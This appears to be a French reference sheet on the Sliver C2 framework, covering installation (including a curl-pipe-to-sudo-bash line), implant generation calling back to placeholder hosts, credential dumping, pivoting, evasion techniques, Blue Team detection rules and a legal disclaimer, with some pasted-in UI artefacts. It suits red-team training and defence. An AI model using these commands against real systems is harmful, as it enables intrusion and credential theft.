# 🐍 Sliver – Framework C2 Post-Exploitation & Adversary Emulation

![Sliver Logo](https://c2.sliver.sh/img/logo.svg)

> **Sliver** est un framework **Command & Control** (C2) moderne, libre (GPL v3) et multiplateforme, écrit en **Go** par **Bishop Fox Labs**.  
> Conçu pour les équipes **Red Team**, les tests d’intrusion et la recherche, il combine génération d’implants, collaboration multi-opérateur et arsenal de post-exploitation avancée.

---

## 🧭 Table des matières
1. [Vue d’ensemble](#1--vue-densemble)  
2. [Architecture](#2--architecture)  
3. [Fonctionnalités clé](#3--fonctionnalités-clé)  
4. [Installation](#4--installation)  
5. [Premiers pas](#5--premiers-pas)  
6. [Génération d’implants](#6--génération-d’implants)  
7. [Transports & Infrastructure C2](#7--transports--infrastructure-c2)  
8. [Post-Exploitation](#8--post-exploitation)  
9. [Extensibilité & Scripting](#9--extensibilité--scripting)  
10. [OPSEC & Évasion](#10--opsec--évasion)  
11. [Détection côté Blue Team](#11--détection-côté-blue-team)  
12. [Usage par des acteurs menaçants](#12--usage-par-des-acteurs-menaçants)  
13. [Comparatif rapide](#13--comparatif-rapide)  
14. [Flux de travail type](#14--flux-de-travail-type)  
15. [Ressources](#15--ressources)  
16. [Avertissement légal](#16--avertissement-légal)  

---

## 1 – Vue d’ensemble  

|  |  |
|---|---|
| **Licence** | GPL v3 |
| **Langage** | Go 1.18+ |
| **OS Serveur / Client** | Linux, macOS, Windows |
| **Implants** | Linux, macOS, Windows (cross-compile vers d’autres cibles Go) |
| **Dernière stable** | **v1.5.43 – 19 février 2025** |
| **Branche dev** | v1.6.0 (`master`) – **dynamic code gen, obfuscation, BOF/COFF loader** |

---

## 2 – Architecture  

```text
┌─────────────┐        mTLS / HTTPS / DNS / WireGuard / TCP
│  Operator   │◀───────────────────────────────────────────┐
└─────────────┘                                            │
        ▲ (CLI / Web UI)                                   ▼
┌─────────────┐   gRPC / WebSocket               ┌─────────────────┐
│  TeamServer │──────────────────────────────────▶│  Implant / BOT │
└─────────────┘                                   └─────────────────┘
        ▲                                                    ▲
        │  (multiplayer mode)                                │
        └──────────────────────── Internal pivots / named pipes
Team Server – cœur C2 ; gère les implants, stockage chiffré, CA X.509.

Operator CLI / Web UI – interface temps réel multi-utilisateur.

Implant – payload dynamiquement compilé, clé RSA / EC unique, comunicaciones sur différents transports.

3 – Fonctionnalités clé
Catégorie	Détails
🎛️ Dynamic Code Gen	Implant recompilé à la volée (Go templates).
🛡️ Chiffrement Fort	Asymétrique (per-binary), mTLS, WireGuard VPN, JWT.
🛰️ Transports C2	HTTP/S, DNS, mTLS, WireGuard, TCP, Named Pipes.
🧩 Armory	Gestionnaire d’extensions (BOF, .NET GhostPack, etc.).
🎮 Multiplayer	Plusieurs opérateurs, ACL RBAC.
🦠 Payloads	EXE, DLL, shellcode, service Windows, Mach-O, ELF, Reflective loader.
🪓 Post-Exploitation	Shell inter­actif, injection processus, migration, token manipulation, LSASS dump, Mimikatz intégrable, screenshot, keylogging, port-fwd, pivot.
🧙 Obfuscation	Compile-time string & symbol obfuscation, custom pacakges.
🕹️ Scripting	JavaScript/TypeScript et Python embarqués.
🔐 Let’s Encrypt	Obtention auto de certs TLS.
📈 Logs	JSON/Elastic-ready, niveau OPSEC configurable.

4 – Installation

4.1 Script « curl » (Linux)
bash
Copier
Modifier
curl https://sliver.sh/install | sudo bash
sliver-server

4.2 Compilation manuelle
bash

git clone https://github.com/BishopFox/sliver
cd sliver && make
./sliver-server   # démarre le serveur
./sliver-client   # connecte l’opérateur

4.3 Docker (exemple)
bash

docker build -t sliver .
docker run -d --name sliver -p 31337:31337/tcp sliver

4.4 Mise à jour
sliver update pour récupérer la dernière release.

Re-compiler si vous suivez master/v1.6.

5 – Premiers pas
bash

# 1. Démarrer un listener HTTPS
sliver > listener --name https443 --protocol https --lhost 0.0.0.0 --lport 443

# 2. Générer un implant Windows stageless
sliver > generate --os windows --arch amd64 --format exe --sleep 60s \
                  --http https://VPS:443 --branch stageless

# 3. Servir ou déposer le payload, puis attendre le callback :
sliver > implants
Accès Web UI par défaut : https://127.0.0.1:8888.

6 – Génération d’implants
Option	Explication
--os	windows, linux, darwin
--arch	amd64, arm64, 386, etc.
--format	exe, dll, service, shellcode, macho, elf
--staged / --stageless	Loader + stage ou binaire autonome
--sleep, --jitter	Profil OPSEC (temps, aléa)
--obfuscate	Active l’obfuscation compile-time
--reflective	Génère un loader Reflective DLL

Exemple shellcode brut :

bash

generate --os windows --arch amd64 --format shellcode \
         --mtls https://cdn.example.com --obfuscate
7 – Transports & Infrastructure C2
Transport	Port(s)	Caractéristique	Détection réseau
mTLS	443/tcp	Certificats client + serveur	faible (TLS)
HTTP/S	80/443	Proxy-friendly, URL aléatoires	moy.
DNS	53/udp	covert channel TXT/A	élevé
WireGuard	51820/udp	Tunnel VPN chiffré	faible
TCP	31337/tcp	Simple / Intranet	faible
namedpipes	–	Inter-processus Windows	locale

8 – Post-Exploitation
8.1 Commandes essentielles
Commande	Action
shell	Prompt interactif (/bin/sh, cmd.exe, pwsh)
screenshot	Capture d’écran PNG
migrate	Injection dans un autre PID
creds	LSASS dump + parsing
portfwd add 0.0.0.0 4444 10.0.0.5 3389	Port-forward RDP
pivot create socks5 9050	Proxy SOCKS interne

8.2 Modules Armory
GhostPack : Rubeus, Seatbelt, Certify…

BOF/COFF loader : exécution en mémoire de Cobalt Strike BOF.

.NET In-Memory : chargement d’assemblies sans toucher au disque.

9 – Extensibilité & Scripting
JavaScript/TypeScript – REPL intégré (js>) pour automatiser.

Python 3 – py> prompt (v1.6).

API gRPC – permet d’écrire des front-ends custom.

Armory – armory install sharpsploit compile et ajoute un module externe.

10 – OPSEC & Évasion
Technique	Détail
Per-Binary Keys	Chaque implant possède sa paire EC/RSA unique.
Jitter / Sleep	Randomisation des beacons.
Compile-Time Obfuscation	Strings, symboles et chemins brouillés.
Domain Fronting	Possible via HTTPS si l’hébergeur l’autorise.
DNS Canary	Détection de sandbox via requêtes leurres.
In-Memory Exec	Assemblies .NET, BOF, shellcode résidant en RAM.

11 – Détection côté Blue Team
Sigma : règles proc_creation_win_hktl_sliver_c2_execution_pattern.yml, win_system_service_install_sliver.yml.

Corelight C2 Collection : package de détection réseau spécifique Sliver.

TLS JA3 : empreintes JA3/JA3S custom mais parfois visibles.

WireGuard : faible visibilité, inspecter trafic UDP 51820.

Recommandé : corréler création de services nommés Sliver & processus sliver-agent.exe, monitorer appels Win32 de migration mémoire et injections VirtualAllocEx.

12 – Usage par des acteurs menaçants
BumbleBee loader → déploiement d’implants Sliver après accès initial.

Observé dans des intrusions APT (SVR) comme alternative à Cobalt Strike.

Ransomware affiliates (Q4 2023) ont remplacé CS par Sliver avant chiffrage.

13 – Comparatif rapide
Sliver	Cobalt Strike	Metasploit	Brute Ratel
Licence	GPL v3 (gratuit)	Propriétaire ($$$)	BSD (gratuit)	Commercial
Langage	Go	Java	Ruby	C#/Go
Transports	HTTP/S, DNS, mTLS, WG, TCP	HTTP/S, DNS, SMB	TCP, HTTP/S, others	HTTP/3, DNS, SMB
Obfuscation	Compile-time	Limited	None natif	Oui
BOF Loader	✅ (v1.6)	✅	❌	✅
Multiplayer	✅	✅	❌	✅
UI Web	✅	❌	❌	✅

14 – Flux de travail type
Recon (Nmap, enum).

Exploit vuln (RCE) ou phishing → dropper Sliver.

Implant callback → prise de contrôle.

Escalade & mouvement latéral (creds, pivot, socks).

Actions objectif (dump data, persistance, exfil).

Clean-Up / Reporting.

15 – Ressources
🌐 Site officiel : https://sliver.sh

🐙 GitHub : https://github.com/BishopFox/sliver

📄 Documentation : https://sliver.sh/docs

🎥 Atelier “Getting Started & 1.6 Features” (Bishop Fox YouTube).

🔍 Sigma Rules : https://detection.fyi/sigmahq/sigma

📊 Corelight Detection Blog.

16 – Avertissement légal
Sliver doit uniquement être utilisé dans un cadre légal : lab personnel, tests d’intrusion autorisés par contrat, exercices Red Team contractualisés.
Toute utilisation sans consentement explicite constitue une infraction pénale dans la plupart des juridictions. L’auteur de ce document décline toute responsabilité.
